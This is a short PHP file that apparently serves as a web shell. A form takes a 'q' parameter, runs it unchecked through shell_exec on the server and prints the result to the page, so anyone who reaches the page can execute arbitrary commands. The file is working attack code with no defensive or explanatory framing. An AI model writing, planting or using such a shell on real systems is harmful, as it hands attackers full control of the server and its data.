<?php
    $q=isset($_GET['q'])?$_GET['q']:'';
?>
        <form>
            <input type="text" name='q' style = "width:100%"/>
            <br/>
            <button type="submit">전송</button>
        </form>
        <br/><br/><br/>
<?php
    if($q!="")
    {
        $out = shell_exec($q);
        $out = str_replace('\n', '<br/>', $out);
        echo $out;
    }
?>